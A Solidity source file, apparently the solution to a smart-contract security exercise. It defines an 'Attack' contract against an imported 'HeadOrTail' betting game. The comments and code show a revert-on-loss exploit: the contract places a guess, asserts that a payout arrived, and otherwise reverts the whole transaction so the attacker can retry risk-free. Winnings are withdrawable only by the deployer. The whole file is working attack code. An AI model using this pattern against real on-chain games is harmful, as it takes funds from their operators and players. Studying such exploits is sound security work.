// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.4;

import "./HeadOrTail.sol";

//The guess() function inside the HeadOrTail push the reward to the winner
//The attack is to guess 1 time and if the Attack contract receive the found that means we win
//Otherwise we revert everything and try again with the other value
contract Attack{
    HeadOrTail c;
    address owner;

    constructor(HeadOrTail _contractAddress) {
        c = HeadOrTail(_contractAddress);
        owner=msg.sender;
    }

    function attack(bool _guess) public payable {
        c.guess{value: msg.value}(_guess);
        assert(address(this).balance != 0);
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdraw() external {
        require(msg.sender==owner);
        payable(owner).transfer(getBalance());
    }
    receive() external payable {}
}
